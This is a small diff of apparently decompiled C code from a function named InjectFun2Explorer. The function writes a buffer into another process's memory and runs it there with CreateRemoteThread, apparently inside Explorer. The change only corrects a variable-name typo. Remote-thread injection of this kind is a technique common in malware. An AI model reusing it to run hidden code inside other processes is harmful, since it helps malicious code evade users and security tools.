@@ -215,11 +215,11 @@ BOOL __fastcall InjectFun2Explorer(LPCVOID lpThreadArgs, HANDLE hProcess, thread
 					{
 						SIZE_T NumberOfBytesWritten = 0;
 						WriteProcessMemory(hProcess, (char*)pProgman_mem + image_size, lpThreadArgs, BUFFER_SIZE, &NumberOfBytesWritten);
-						HANDLE hTread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((char*)pProgman_mem + ((char*)callBack - (char*)hModule)),
+						HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((char*)pProgman_mem + ((char*)callBack - (char*)hModule)),
 							(char*)pProgman_mem + image_size, 0, 0i64);
-						WaitForSingleObject(hTread, 15 * 1000);
-						TerminateThread(hTread, 0);
-						CloseHandle(hTread);
+						WaitForSingleObject(hThread, 15 * 1000);
+						TerminateThread(hThread, 0);
+						CloseHandle(hThread);
 					}
 					VirtualFree(pLocalMem, 0i64, MEM_RELEASE);
 				}
